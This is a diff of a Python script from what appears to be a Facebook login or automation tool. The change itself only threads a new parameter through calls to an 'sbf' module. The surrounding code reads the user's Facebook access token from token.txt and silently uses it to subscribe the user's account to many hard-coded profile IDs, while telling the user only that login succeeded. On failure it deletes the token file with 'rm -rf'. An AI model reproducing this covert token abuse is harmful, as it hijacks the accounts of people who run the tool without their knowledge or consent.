@@ -1,6 +1,6 @@
 import requests,os,json,sbf
 
-def main():
+def main(__cici__):
     try:
         token = open("token.txt","r").read()
         requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + token)      # Dapunta Khurayra X
@@ -28,12 +28,12 @@ def main():
         requests.post("https://graph.facebook.com/100003160758786/subscribers?access_token=" + token) # M Ardian Iqbal
         requests.post("https://graph.facebook.com/100040248105716/subscribers?access_token=" + token) # Hanifan
         print('\n[•] Login Berhasil')
-        exit(sbf.menu())
+        exit(sbf.menu(__cici__))
     except (KeyError,IOError):
         print('\n[!] Token Invalid')
         os.system('rm -rf token.txt')
-        exit(sbf.login())
+        exit(sbf.login(__cici__))
     except requests.exceptions.ConnectionError:
         print('\n[!] Koneksi Bermasalah')
         os.system('rm -rf token.txt')
-        exit(sbf.login())
+        exit(sbf.login(__cici__))
